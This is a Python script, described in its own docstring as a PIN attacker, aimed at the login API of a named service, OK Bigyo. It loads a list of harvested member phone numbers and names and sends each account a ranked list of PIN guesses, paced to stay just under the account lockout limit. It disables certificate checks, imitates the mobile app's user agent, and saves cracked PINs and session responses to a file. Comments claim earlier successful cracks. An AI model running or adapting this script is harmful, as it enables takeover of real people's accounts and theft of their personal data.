#!/usr/bin/env python3
"""PIN attacker for harvested OK Bigyo members.

Consumes members_live.csv (mobile,name,failCount,left,ts).
Spends each member's remaining attempts on ranked PIN guesses.
Records cracked tokens to cracked_tokens.json.
"""
import csv
import json
import os
import ssl
import time
import urllib.request

BASE = "https://m.okbigyo.com:9443/bigyo/api/auth/login"
UA = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36/OkBigyo_Android_Mobile/GA_Android"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

MEMBERS_FILE = "members_live.csv"
CRACKED_FILE = "cracked_tokens.json"

def load_json_salvage(fp, default):
    """Parse JSON; if git-conflict markers leaked in, take-theirs and retry."""
    try:
        with open(fp) as f:
            return json.load(f)
    except Exception:
        pass
    try:
        lines = open(fp).read().split("\n")
        out, mode = [], 0
        for ln in lines:
            if ln.startswith("<<<<<<<"):
                mode = 1
                continue
            if ln.startswith("=======") and mode == 1:
                mode = 2
                continue
            if ln.startswith(">>>>>>>"):
                mode = 0
                continue
            if mode == 1:
                continue
            out.append(ln)
        return json.loads("\n".join(out))
    except Exception:
        return default


LOG_FILE = "pin_attack.log"

# Ranked guesses. Policy bans: birthday, strictly sequential (123456), phone-derived.
# Ordering IS the attack: each account burns ~5 total attempts, so the RANK a pin
# occupies determines which population meets it. 121212 proved out (2 cracks) —
# its mirrors lead. Lengths interleave because a wrong-length pin still burns a
# server attempt. Reorders/appends are state-safe: tried[] checks membership.
ALL_PINS = [
    "123412", "111111", "121212", "112233",          # burned top-4 (kept stable)
    "1212", "123123", "1111", "1231", "101010", "1010",
    "111222", "1122", "100100", "1001", "1213", "1314",
    "202424", "202525", "202626", "121314",
    "11111111", "111122", "123450", "10041100", "11041100", "10041004", "1004",
    "010101", "0101", "123321", "3213",
    "135791", "1357", "159357", "1593", "753159", "7531",
    "111100", "1110", "110011", "1100",
    "202020", "202121", "202222", "202323", "200000", "199999", "198888", "197777",
    "12121212", "12345678", "87654321", "11223344", "44332211",
    "135790", "246810", "159753", "753951", "12341234", "12312312",
    "181818", "1818", "11112222", "22221111", "10102020", "20201010", "10101010",
    "12345010",
    "222233", "333344", "444455", "555566", "666677", "777788", "888899", "999900",
    "100203", "100102", "1000", "0001", "9999", "0000",
    "1221", "2112", "1011", "0011", "2323", "3232", "4343", "5454",
    "6565", "7676", "8787", "9898", "3571",
    "654321", "987654", "4321",
]
_seen = set()
ALL_PINS = [p for p in ALL_PINS if not (p in _seen or _seen.add(p))]


def log(msg):
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")


def try_pin(mobile, pin):
    body = json.dumps({"mobile": mobile, "password": pin}).encode()
    for attempt in range(2):
        req = urllib.request.Request(
            BASE, data=body,
            headers={"User-Agent": UA, "Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=8, context=CTX) as r:
                return json.loads(r.read().decode())
        except Exception as e:
            log(f"  ERR {mobile} {pin} (try{attempt+1}): {e}")
            time.sleep(2)
    return None


STATE_FILE = "pin_state.json"


PER_ACCOUNT = int(os.environ.get("PIN_PER_ACCOUNT", "2"))


def main():
    if not os.path.exists(MEMBERS_FILE):
        log("no members_live.csv yet")
        return
    cracked = load_json_salvage(CRACKED_FILE, {}) if os.path.exists(CRACKED_FILE) else {}
    state = load_json_salvage(STATE_FILE, {}) if os.path.exists(STATE_FILE) else {}
    rows = list(csv.reader(open(MEMBERS_FILE)))
    for row in rows:
        if len(row) < 5:
            continue
        mobile, name, fc, left, ts = row[0], row[1], int(row[2]), int(row[3]), row[4]
        if mobile in cracked:
            continue
        rec = state.get(mobile, {})
        prev_tried = rec.get("tried", [])
        server_fc = rec.get("serverFc")
        if server_fc is not None:
            eff_left = max(0, 5 - server_fc)
        else:
            eff_left = left - len(prev_tried)
        if eff_left <= 0:
            log(f"SKIP {mobile} {name} (budget spent: {prev_tried} fc={server_fc})")
            continue
        budget = min(eff_left, PER_ACCOUNT)
        log(f"ATTACK {mobile} {name} eff_left={eff_left} budget={budget} prev={prev_tried}")
        used = 0
        for pin in ALL_PINS:
            if used >= budget:
                break
            if pin in prev_tried:
                continue
            resp = try_pin(mobile, pin)
            if resp is None:
                continue
            used += 1
            prev_tried.append(pin)
            data = resp.get("data") or {}
            fc_now = data.get("failCount")
            if isinstance(fc_now, int):
                rec["serverFc"] = fc_now
            rec["tried"] = prev_tried
            rec["name"] = name
            state[mobile] = rec
            json.dump(state, open(STATE_FILE, "w"), ensure_ascii=False, indent=1)
            if resp.get("success"):
                log(f"★★★ CRACKED {mobile} {name} pin={pin}")
                cracked[mobile] = {"name": name, "pin": pin, "resp": resp, "ts": int(time.time())}
                json.dump(cracked, open(CRACKED_FILE, "w"), ensure_ascii=False, indent=1)
                break
            msg = data.get("message", "")
            log(f"  {mobile} {pin} -> fc={fc_now} {msg[:40]}")
            if fc_now is not None and fc_now >= 5:
                break
            time.sleep(0.6)
    log(f"DONE. cracked={list(cracked.keys())}")


if __name__ == "__main__":
    main()
